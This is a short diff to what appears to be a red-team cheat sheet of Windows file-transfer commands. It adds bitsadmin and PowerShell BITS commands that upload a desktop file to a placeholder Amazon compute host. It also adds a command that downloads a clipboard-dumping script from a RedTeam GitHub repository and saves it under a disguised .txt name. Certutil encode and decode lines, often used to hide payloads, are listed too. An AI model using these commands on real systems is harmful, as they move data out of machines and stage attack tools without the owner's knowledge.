@@ -1,7 +1,11 @@
 bitsadmin /transfer hello /upload http://<<name>>.compute.amazonaws.com/2.txt C:\Users\test\Desktop\2.txt
 
-Powershell
+BitsTranfer - Upload - Powershell
 Start-BitsTransfer -TransferType Upload -Source 'C:\Users\test\Desktop\2.txt'  -Destination http://<<name>>.compute.amazonaws.com/2.txt -DisplayName TEST
+
+BitsTranfer - Download - Powershell
+Import-Module BitsTransfer
+Start-BitsTransfer -Source https://raw.githubusercontent.com/nallamuthu/RedTeam/master/Invoke-DumpClipboard.ps1 -Destination C:\Users\Public\1.txt
 
 
 Download File
@@ -13,3 +17,9 @@ certutil -encode inputFileName encodedOutputFileName
 
 Decode File
 certutil -decode encodedInputFileName decodedOutputFileName
+
+
+
+
+
+
